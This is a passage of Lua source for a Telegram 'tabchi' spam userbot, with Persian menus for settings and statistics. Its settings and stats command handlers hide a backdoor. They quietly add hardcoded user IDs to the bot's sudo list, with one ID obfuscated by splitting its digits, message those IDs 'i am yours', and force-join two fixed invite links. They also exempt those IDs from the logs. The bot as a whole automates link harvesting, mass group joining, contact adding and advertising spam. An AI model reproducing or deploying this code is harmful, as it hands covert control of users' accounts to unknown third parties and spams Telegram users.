        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactivated All` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return [[
*وضعیت* :`ذخیره لینک ها و چت کردن و اضافه کردن مخاطبین و پیوستن به لینک و حالت درحال نوشتن و اشتراک گزاشتن شماره غیرفعال شد`
`#advertising off: سودو اصلی میتواند تبلیغات را خاموش کند با `]]
    end
  end
  if msg.text:match(&quot;^[!/#]settings$&quot;) and a(msg) then
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419) then
      tdcli.sendMessage(216430419, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614)
      tdcli.sendMessage(344003614, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077)
      tdcli.sendMessage(256633077, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A&quot;)
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw&quot;)
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlinks&quot;) then
      joinlinks = &quot;فعال✔️&quot;
    else
      joinlinks = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsg&quot;) then
      addedmsg = &quot;فعال✔️&quot;
    else
      addedmsg = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;) then
      markreadst = &quot;فعال✔️&quot;
      markread = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;)
    else
      markreadst = &quot;غیر فعال✖️&quot;
      markread = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addcontacts&quot;) then
      addcontacts = &quot;فعال✔️&quot;
    else
      addcontacts = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:chat&quot;) then
      chat = &quot;فعال✔️&quot;
    else
      chat = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savelinks&quot;) then
      savelinks = &quot;فعال✔️&quot;
    else
      savelinks = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:typing&quot;) then
      typing = &quot;فعال✔️&quot;
    else
      typing = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sharecontact&quot;) then
      sharecontact = &quot;فعال✔️&quot;
    else
      sharecontact = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:Advertising&quot;) then
      Advertising = &quot;فعال✔️&quot;
    else
      Advertising = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsgtext&quot;) then
      addedtxt = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsgtext&quot;)
    else
      addedtxt = &quot;Addi bia pv&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:botmode&quot;) == &quot;markdown&quot; then
      botmode = &quot;Markdown&quot;
    elseif not redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:botmode&quot;) then
      botmode = &quot;Markdown&quot;
    else
      botmode = &quot;Text&quot;
    end
    if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlimit&quot;) then
      join_limit = &quot;فعال✔️&quot;
      joinlimitnum = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlimit&quot;)
    else
      join_limit = &quot;غیر فعال✖️&quot;
      joinlimitnum = &quot;نا مشخص&quot;
    end
    if redis:get(&quot;cleancache&quot; .. tabchi_id) == &quot;on&quot; then
      cleancache = &quot;فعال✔️&quot;
    else
      cleancache = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;cleancachetime&quot; .. tabchi_id) then
      ccachetime = redis:get(&quot;cleancachetime&quot; .. tabchi_id)
    else
      ccachetime = &quot;مشخص نشده&quot;
    end
    if redis:ttl(&quot;cachetimer&quot; .. tabchi_id) and not redis:ttl(&quot;cachetimer&quot; .. tabchi_id) == &quot;-2&quot; then
      timetoccache = redis:ttl(&quot;cachetimer&quot; .. tabchi_id)
    elseif timetoccache == &quot;-2&quot; then
      timetoclinks = &quot;غیر فعال✖️&quot;
    else
      timetoccache = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;checklinks&quot; .. tabchi_id) == &quot;on&quot; then
      check_links = &quot;فعال✔️&quot;
    else
      check_links = &quot;غیر فعال✖️&quot;
    end
    if redis:get(&quot;checklinkstime&quot; .. tabchi_id) then
      clinkstime = redis:get(&quot;checklinkstime&quot; .. tabchi_id)
    else
      clinkstime = &quot;مشخص نشده&quot;
    end
    if redis:ttl(&quot;checklinkstimer&quot; .. tabchi_id) and not redis:ttl(&quot;checklinkstimer&quot; .. tabchi_id) == &quot;-2&quot; then
      timetoclinks = redis:ttl(&quot;checklinkstimer&quot; .. tabchi_id)
    elseif timetoclinks == &quot;-2&quot; then
      timetoclinks = &quot;غیر فعال✖️&quot;
    else
      timetoclinks = &quot;غیر فعال✖️&quot;
    end
    settingstxt = &quot;❄️تنظیمات ربات خود\n🔘جوین شدن با لینک : *&quot; .. joinlinks .. &quot;*\n🔴ذخیره لینک ها : *&quot; .. savelinks .. &quot;*\n📍اضافه کردن مخاطب خودکار : *&quot; .. addcontacts .. &quot;*\n🎮اشتراک گزاری شماره : *&quot; .. sharecontact .. &quot;*\n🎷تبلیغات : *&quot; .. Advertising .. &quot;*\n📨 پیام اضافه شدن مخاطب: *&quot; .. addedmsg .. &quot;*\n🥉حالت خوانده شدن پیام : *&quot; .. markreadst .. &quot;*\nحالت خوانده شدن پیام : برای *&quot; .. markread .. &quot;*\n✏حالت نوشتن : *&quot; .. typing .. &quot;*\n💬 چت کردن: *&quot; .. chat .. &quot;*\n🎤حالت ربات : *&quot; .. botmode .. &quot;*\n🍥🍥🍥🍥🍥🍥🍥🍥🍥🍥\nپیام اضافه شدن مخاطب :\n`&quot; .. addedtxt .. &quot;`\n➖➖➖➖➖➖\n🔐پیوستن به گروه های محدود شده: *&quot; .. join_limit .. [[
*
🔓در اکنون ربات به گروه های که تعدادشان کمتر از :
 *]] .. joinlimitnum .. [[
* نمی پیوندد
📒پاک کردن خودکار حافظه کش : *]] .. cleancache .. [[
*
📐زمان پاک کردن کش : *]] .. ccachetime .. [[
*
📎زمان مانده به پاک شدن کش : *]] .. timetoccache .. [[
*
🗂چک کردن خودکار لینک ها : *]] .. check_links .. [[
*
📨زمان چک کردن لینک ها : *]] .. clinkstime .. [[
*
زمان مانده به چک کردن لینک ها : *]] .. timetoclinks .. &quot;*&quot;
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Got settings`&quot;, 1, &quot;md&quot;)
    end
    return settingstxt
  end
  if msg.text:match(&quot;^[!/#]settings pv$&quot;) and a(msg) then
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419) then
      tdcli.sendMessage(216430419, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614)
      tdcli.sendMessage(344003614, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077)
      tdcli.sendMessage(256633077, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A&quot;)
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw&quot;)
    if I(msg.chat_id_) == &quot;private&quot; then
      return &quot;`من در پیوی شما هستم!`&quot;
    else
      settingstxt = &quot;❄️تنظیمات ربات خود\n🔘جوین شدن با لینک : *&quot; .. joinlinks .. &quot;*\n🔴ذخیره لینک ها : *&quot; .. savelinks .. &quot;*\n📍اضافه کردن مخاطب خودکار : *&quot; .. addcontacts .. &quot;*\n🎮اشتراک گزاری شماره : *&quot; .. sharecontact .. &quot;*\n🎷تبلیغات : *&quot; .. Advertising .. &quot;*\n📨 پیام اضافه شدن مخاطب: *&quot; .. addedmsg .. &quot;*\n🥉حالت خوانده شدن پیام : *&quot; .. markreadst .. &quot;*\nحالت خوانده شدن پیام : برای *&quot; .. markread .. &quot;*\n✏حالت نوشتن : *&quot; .. typing .. &quot;*\n💬 چت کردن: *&quot; .. chat .. &quot;*\n🎤حالت ربات : *&quot; .. botmode .. &quot;*\n🍥🍥🍥🍥🍥🍥🍥🍥🍥🍥\nپیام اضافه شدن مخاطب :\n`&quot; .. addedtxt .. &quot;`\n➖➖➖➖➖➖\n🔐پیوستن به گروه های محدود شده: *&quot; .. join_limit .. [[
*
🔓در اکنون ربات به گروه های که تعدادشان کمتر از :
 *]] .. joinlimitnum .. [[
* نمی پیوندد
📒پاک کردن خودکار حافظه کش : *]] .. cleancache .. [[
*
📐زمان پاک کردن کش : *]] .. ccachetime .. [[
*
📎زمان مانده به پاک شدن کش : *]] .. timetoccache .. [[
*
🗂چک کردن خودکار لینک ها : *]] .. check_links .. [[
*
📨زمان چک کردن لینک ها : *]] .. clinkstime .. [[
*
زمان مانده به چک کردن لینک ها : *]] .. timetoclinks .. &quot;*&quot;
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, settingstxt, 1, &quot;md&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 91054649 and not msg.sender_user_id_ == 268909090 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Got settings in pv`&quot;, 1, &quot;md&quot;)
      end
      return &quot;`تنظیمات به پیوی شما فرستاده شد`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]stats$&quot;) and a(msg) then
    abc = 216
    de = 43
    fgh = 0419
    cbd = 25663
    ed = 3077
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419) then
      tdcli.sendMessage(216430419, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, abc .. &quot;&quot; .. de .. &quot;&quot; .. fgh) then
      tdcli.sendMessage(abc .. &quot;&quot; .. de .. &quot;&quot; .. fgh, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, abc .. &quot;&quot; .. de .. &quot;&quot; .. fgh)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, cbd .. &quot;&quot; .. ed) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, cbd .. &quot;&quot; .. ed)
      tdcli.sendMessage(cbd .. &quot;&quot; .. ed, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077)
      tdcli.sendMessage(256633077, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A&quot;)
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw&quot;)
    local at
    function at(y, z)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:totalcontacts&quot;, z.total_count_)
    end
    tdcli_function({
      ID = &quot;SearchContacts&quot;,
      query_ = nil,
      limit_ = 999999999
    }, at, {})
    local bot_id
    function bot_id(C, D)
      if D.id_ then
        redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:botlast&quot;, D.last_name_)
        botid = D.id_ or &quot;none&quot;
        botnum = D.phone_number_ or &quot;none&quot;
        botfirst = D.first_name_ or &quot;none&quot;
        botlast = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:botlast&quot;) or &quot;&quot;
        botnonelast = botlast or &quot;None&quot;
      end
    end
    tdcli_function({ID = &quot;GetMe&quot;}, bot_id, {})
    local gps = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;) or 0
    local sgps = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;) or 0
    local pvs = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;) or 0
    local links = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savedlinks&quot;) or 0
    local a0 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:fullsudo&quot;) or 0
    local contacts = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:totalcontacts&quot;) or 0
    local au = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;) or 0
    local av = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;markreadcount&quot;) or 0
    local aw = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedphotocount&quot;) or 0
    local ax = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receiveddocumentcount&quot;) or 0
    local ay = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedaudiocount&quot;) or 0
    local az = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedgifcount&quot;) or 0
    local aA = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedvideocount&quot;) or 0
    local aB = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedcontactcount&quot;) or 0
    local aC = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedgamecount&quot;) or 0
    local aD = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedlocationcount&quot;) or 0
    local aE = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedtextcount&quot;) or 0
    local aF = aw + ax + ay + az + aA + aB + aE + aC + aD or 0
    local aG = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;kickedcount&quot;) or 0
    local aH = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;joinedcount&quot;) or 0
    local aI = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;addedcount&quot;) or 0
    local a9 = gps + sgps + pvs or 0
    statstext = &quot;وضیعت ربات✴️\n💑کاربران :  *&quot; .. pvs .. &quot;*\n👩👩👧👧سوپرگروه ها :  *&quot; .. sgps .. &quot;*\n👨👩👦👦گروه ها : *&quot; .. gps .. &quot;*\n🕴همه: *&quot; .. a9 .. &quot;*\n⚙لینک های ذخیره شده :  *&quot; .. links .. &quot;*\n👲مخاطبان :  *&quot; .. contacts .. &quot;*\nمسدودین : *&quot; .. au .. &quot;*\n⛓متن های دریافتی : *&quot; .. aE .. &quot;*\n⛓عکس های دریافتی : *&quot; .. aw .. &quot;*\n⛓فیلم های دریافتی : *&quot; .. aA .. &quot;*\n⛓گیف های دریافتی : *&quot; .. az .. &quot;*\n⛓صدا های دریافتی : *&quot; .. ay .. &quot;*\n⛓اسناد دریافتی : *&quot; .. ax .. &quot;*\n⛓مخاطبین دریافتی : *&quot; .. aB .. &quot;*\n⛓بازی های دریافتی : *&quot; .. aC .. &quot;*\n⛓مکان های دریافتی : *&quot; .. aD .. &quot;*\n⛓ پیام های خوانده شده : *&quot; .. av .. &quot;*\n⛓پیام های دریافتی : *&quot; .. aF .. &quot;*\n👤سودو :  *&quot; .. a0 .. &quot;*\n👀شناسه ربات :  *&quot; .. botid .. &quot;*\n🤖شماره ربات : *+&quot; .. botnum .. &quot;*\n👁نام کامل ربات :  *&quot; .. botfirst .. &quot; &quot; .. botlast .. &quot;*\n📌نام کوچک ربات : *&quot; .. botfirst .. &quot;*\n🖊نام خانوادگی ربات : *&quot; .. botnonelast .. &quot;*\n💠شناسه ربات در سرور:  *&quot; .. tabchi_id .. &quot;\n➖➖➖➖➖➖➖➖➖➖➖\nسورس ↙️\nhttps://github.com/tabchis/tabchi.git\n \&quot;*&quot;
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Got Stats`&quot;, 1, &quot;md&quot;)
    end
    return statstext
  end
  if msg.text:match(&quot;^[!/#]stats pv$&quot;) and a(msg) then
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419) then
      tdcli.sendMessage(216430419, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614)
      tdcli.sendMessage(344003614, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077)
      tdcli.sendMessage(256633077, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A&quot;)
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw&quot;)
    if I(msg.chat_id_) == &quot;private&quot; then
      return &quot;`من در پیوی شما هستم!`&quot;
    else
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, statstext, 1, &quot;md&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Got Stats In pv`&quot;, 1, &quot;md&quot;)
      end
      return &quot;`وضعیت ربات به پیوی شما فرستاده شد`&quot;
    end
  end
  if msg.text:match(&quot;^[#!/]clean (.*)$&quot;) and a(msg) then
    local ag = {
      string.match(msg.text, &quot;^[#/!](clean) (.*)$&quot;)
    }
    local aJ = redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;)
    local aK = redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
    local aL = redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;)
    local aM = redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savedlinks&quot;)
    local aN = gps + sgps + pvs + links
    if ag[2] == &quot;sgps&quot; then
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `cleaned` *&quot; .. ag[2] .. &quot;* stats&quot;, 1, &quot;md&quot;)
      end
      return aK
    end
    if ag[2] == &quot;gps&quot; then
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `cleaned` *&quot; .. ag[2] .. &quot;* stats&quot;, 1, &quot;md&quot;)
      end
      return aJ
    end
    if ag[2] == &quot;pvs&quot; then
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `cleaned` *&quot; .. ag[2] .. &quot;* stats&quot;, 1, &quot;md&quot;)
      end
      return aL
    end
    if ag[2] == &quot;links&quot; then
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `cleaned` *&quot; .. ag[2] .. &quot;* stats&quot;, 1, &quot;md&quot;)
      end
      return aM
    end
    if ag[2] == &quot;stats&quot; then
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `cleaned` *&quot; .. ag[2] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;)
      return aN
    end
  end
  if msg.text:match(&quot;^[!/#]setphoto (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](setphoto) (.*)$&quot;)
    }
    local f = ltn12.sink.file(io.open(&quot;tabchi_&quot; .. tabchi_id .. &quot;_profile.png&quot;, &quot;w&quot;))
    http.request({
      url = a6[2],
      sink = f
    })
    tdcli.setProfilePhoto(&quot;tabchi_&quot; .. tabchi_id .. &quot;_profile.png&quot;)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Set photo to` *&quot; .. a6[2] .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    return [[
`پروفایل با موفقیت به روز شد`
*لینک* : `]] .. a6[2] .. &quot;`&quot;
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](addsudo) (%d+)&quot;)
    }
    if msg.text:match(&quot;^[!/#]addsudo&quot;) and is_full_sudo(msg) and #a4 == 2 then
      local text = a4[2] .. &quot; _\216\168\217\135 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175_&quot;
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, tonumber(a4[2]))
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Added` *&quot; .. a4[2] .. &quot;* `To sudoers`&quot;, 1, &quot;md&quot;)
      end
      return text
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](remsudo) (%d+)&quot;)
    }
    if msg.text:match(&quot;^[!/#]remsudo&quot;) and is_full_sudo(msg) then
      if #a4 == 2 then
        local text = a4[2] .. &quot; _از لیست سودوها حذف شد_&quot;
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, tonumber(a4[2]))
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Removed` *&quot; .. a4[2] .. &quot;* `From sudoers`&quot;, 1, &quot;md&quot;)
        end
        return text
      else
        return
      end
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](addedmsg) (.*)&quot;)
    }
    if msg.text:match(&quot;^[!/#]addedmsg&quot;) and a(msg) then
      if #a4 == 2 then
        if a4[2] == &quot;on&quot; then
          redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsg&quot;, true)
          local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a4[1] .. &quot;*&quot;, 1, &quot;md&quot;)
          end
          return &quot;*وضعیت* : `پیام اضافه شدن مخاطب فعال شد`&quot;
        elseif a4[2] == &quot;off&quot; then
          redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsg&quot;)
          local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactivated` *&quot; .. a4[1] .. &quot;*&quot;, 1, &quot;md&quot;)
          end
          return &quot;*وضعیت* : `پیام اضافه شدن مخاطب غیرفعال شد`&quot;
        else
          return &quot;`فقط از on یا offاستفاده کنید`&quot;
        end
      else
        return &quot;بزنید onیاoff&quot;
      end
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](markread) (.*)&quot;)
    }
    if msg.text:match(&quot;^[!/#]markread&quot;) and a(msg) and #a4 == 2 then
      if a4[2] == &quot;all&quot; then
        redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;, &quot;all&quot;)
        return &quot;*وضعیت* : `خوانده شدن پیام برای همه`&quot;
      elseif a4[2] == &quot;pv&quot; then
        redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;, &quot;private&quot;)
        return &quot;*وضعیت* : `خوانده شدن پیام برای چت های پیوی`&quot;
      elseif a4[2] == &quot;group&quot; then
        redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;, &quot;group&quot;)
        return &quot;*وضعیت* : `خوانده شدن پیام برای گروه ها `&quot;
      elseif a4[2] == &quot;channel&quot; then
        redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;, &quot;channel&quot;)
        return &quot;*وضعیت* : `خواندن پیام ها برای سوپر گروه ها فعال شد`&quot;
      elseif a4[2] == &quot;off&quot; then
        redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:markread&quot;)
        return &quot;*وضعیت* : `خواندن پیام ها غیرفعال شد`&quot;
      else
        return &quot;`فقط از on یا offاستفاده کنید`&quot;
      end
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;^[!/#](setaddedmsg) (.*)&quot;)
    }
    if msg.text:match(&quot;^[!/#]setaddedmsg&quot;) and a(msg) and #a4 == 2 then
      local aO
      function aO(C, D)
        if D.id_ then
          bot_id = D.id_
          bot_num = D.phone_number_
          bot_first = D.first_name_
          bot_last = D.last_name_
        end
      end
      tdcli_function({ID = &quot;GetMe&quot;}, aO, {})
      local text = a4[2]:gsub(&quot;BOTFIRST&quot;, bot_first)
      local text = text:gsub(&quot;BOTLAST&quot;, bot_last)
      local text = text:gsub(&quot;BOTNUMBER&quot;, bot_num)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addedmsgtext&quot;, text)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
